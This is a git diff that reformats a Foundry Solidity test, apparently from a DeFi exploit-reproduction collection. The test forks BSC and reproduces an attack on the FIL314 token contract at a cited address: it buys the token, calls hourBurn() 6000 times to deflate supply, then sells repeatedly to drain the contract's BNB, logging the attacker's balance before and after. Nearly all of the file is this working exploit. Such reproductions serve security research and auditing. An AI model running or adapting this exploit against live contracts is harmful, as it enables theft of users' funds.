@@ -13,13 +13,16 @@ import "forge-std/Test.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0xe8a290c6fc6fa6c0b79c9cfae1878d195aeb59af#code
 
 interface IFIL314 {
+
     function getAmountOut(uint256 value, bool buy) external returns (uint256);
     function hourBurn() external;
     function transfer(address to, uint256 value) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
+
 }
 
 contract FIL314 is Test {
+
     uint256 blocknumToForkFrom = 37_795_991;
     IFIL314 _FIL314 = IFIL314(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF);
 
@@ -29,34 +32,24 @@ contract FIL314 is Test {
 
     function testExploit() public {
         // Implement exploit code here
-        emit log_named_decimal_uint(
-            " Attacker BNB Balance Before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint(" Attacker BNB Balance Before exploit", address(this).balance, 18);
         // buy FIL314 token
-        (bool success, ) = address(_FIL314).call{value: 0.05 ether}("");
+        (bool success,) = address(_FIL314).call{value: 0.05 ether}("");
         // deflate the token
         for (uint256 i = 0; i < 6000; i++) {
             _FIL314.hourBurn();
         }
         for (uint256 i = 0; i < 10; i++) {
-            uint256 amount = _FIL314.getAmountOut(
-                address(_FIL314).balance,
-                true
-            );
+            uint256 amount = _FIL314.getAmountOut(address(_FIL314).balance, true);
             // sell the token
             _FIL314.transfer(address(_FIL314), amount);
         }
 
         // Log balances after exploit
-        emit log_named_decimal_uint(
-            " Attacker BNB Balance After exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint(" Attacker BNB Balance After exploit", address(this).balance, 18);
     }
 
     fallback() external payable {}
     receive() external payable {}
+
 }
